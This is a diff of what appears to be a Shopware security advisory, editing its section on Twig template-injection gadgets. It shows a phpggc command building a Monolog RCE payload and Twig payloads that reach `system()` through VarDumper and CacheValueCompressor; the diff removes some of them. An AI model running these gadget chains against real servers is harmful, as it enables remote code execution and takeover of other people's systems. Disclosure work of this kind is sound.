@@ -169,19 +169,11 @@ Compressed payload is generated using:
 $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
 ```
 
-```
-{{ [" here "] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}
-```
-
 #### Gadget 2: 
 Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Component\VarDumper\Vardumper::dump()` to invoke `system("id")`:
 
 ```
 {{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler']) | length }}
-```
-
-```
-{{ ['id'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'dump']) | length }}
 ```
 
 #### Gadget 3: 
